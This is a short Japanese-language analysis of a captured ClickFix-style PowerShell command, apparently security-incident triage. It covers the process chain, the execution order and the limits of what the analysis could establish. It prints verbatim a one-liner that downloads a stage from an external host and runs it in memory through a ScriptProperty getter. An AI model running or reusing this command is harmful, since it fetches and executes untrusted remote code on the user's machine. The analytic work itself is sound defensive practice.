# process・command line解析

## 原文

```powershell
powershell -c "$a=irm 'spielportal.com/cj5JpRGuScm5B9ok7';$o=[pscustomobject]@{v=1};$o|Add-Member ScriptProperty p ([ScriptBlock]::Create($a));$o.p|Out-Null"
```

## process chain

```text
利用者起点（Run dialogまたは既存shell） → powershell.exe → ScriptBlock.Create → ScriptProperty getter評価（同一process）
```

## 処理順

1. 利用者がClickFix誘導に従い、Run dialogまたは既存PowerShellへ文字列を貼り付ける想定である。貼り付け・実行の実観測はない。
2. `Invoke-RestMethod + 動的ScriptProperty getter`によりstageを取得し、PowerShellのmemory内で評価する。
3. 取得stageが追加processを生成できるが、現在の応答からstageを復元できず、子process名・引数・永続化は確定できない。

## 復号後の最終command／URL

```text
該当なし（原文のまま解釈）
```

## 解析上の境界

- captured commandのprocess列は静的に復元した候補であり、実行済みprocess treeではない。
- analyst probeはGETのみで、PowerShell、script、payloadを起動していない。
- 取得不能な後段内容を、既知ClickFix campaignの一般的挙動から補完していない。
